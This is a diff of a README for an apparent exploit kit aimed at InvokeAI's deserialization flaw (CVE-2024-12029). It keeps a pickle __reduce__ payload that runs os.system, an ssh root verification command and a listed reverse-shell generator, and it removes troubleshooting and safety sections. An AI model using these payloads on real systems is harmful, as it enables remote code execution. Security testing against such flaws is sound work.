@@ -34,17 +34,10 @@ When SSH key injection payloads are delivered successfully (Status 201) but SSH 
 
 #### **Kali Test Scripts**
 - `kali_reverse_test.py` - Comprehensive test suite
-- `kali_quick_test.py` - Quick execution test
-- `kali_linux_test.py` - Linux-compatible test
+
 
 #### **Payload Generators**
 - `reverse_shell_payload.py` - Generate reverse shell payloads
-- `alternative_payload.py` - Alternative execution methods
-- `simple_linux_payload.py` - Linux-compatible payloads
-
-#### **Server & Exploit**
-- `web_server.py` - Payload hosting server
-- `exploit.py` - Full-featured exploit script
 
 ## 🚀 Quick Usage
 
@@ -95,12 +88,6 @@ ssh root@192.168.117.218 'cat /tmp/payload_test.txt'
 - **Next step**: Try alternative SSH injection methods
 - **Check**: `/tmp/payload_test.txt` on target
 
-### ❌ **All Tests Fail**
-- **What it means**: Pickle deserialization not happening
-- **Possible causes**: Target patched, sandboxed, or vulnerability fixed
-- **Next step**: Verify target vulnerability and version
-
-## 🔧 Payload Analysis
 
 ### **Callback Payload**
 ```python
@@ -128,67 +115,12 @@ class TestPayload:
         return (os.system, ('echo "PAYLOAD_EXECUTED_$(date)" > /tmp/payload_test.txt',))
 ```
 
-## 🛡️ Security Considerations
-
-### **For Authorized Testing Only**
-- Use only on systems you have permission to test
-- Verify target vulnerability before exploitation
-- Ensure proper network isolation
-
-### **Payload Safety**
-- Payloads use built-in Python modules only
-- No external dependencies required
-- Cross-platform compatible (Linux target)
-
-## 📋 Troubleshooting
-
-### **Common Issues**
-
-1. **Payload Delivery Fails**
-   - Check network connectivity
-   - Verify web server is running
-   - Check target URL and port
-
-2. **Callback Not Received**
-   - Check firewall rules
-   - Verify web server logs
-   - Test with simple HTTP request
-
-3. **Reverse Shell No Connection**
-   - Ensure netcat listener is running
-   - Check firewall on attacker machine
-   - Verify target can reach attacker IP
-
-4. **Test File Not Created**
-   - Commands may be sandboxed
-   - File permissions issue
-   - Try alternative execution methods
-
-### **Debug Commands**
-```bash
-# Check if InvokeAI is vulnerable
-curl http://192.168.117.218:9090/api/v2/models/install
-
-# Check web server logs
-tail -f web_server.log
-
-# Test network connectivity
-telnet 192.168.117.218 9090
-```
-
 ## 📚 References
 
 - **CVE-2024-12029**: InvokeAI Remote Code Execution
 - **PyTorch Unsafe Deserialization**: `torch.load()` vulnerability
 - **Pickle __reduce__**: Python object serialization exploitation
 
-## 🤝 Contributing
-
-For improvements or additional payload variants:
-1. Test payloads in isolated environment
-2. Verify cross-platform compatibility  
-3. Update documentation
-4. Submit pull request
 
 ## ⚠️ Disclaimer
 
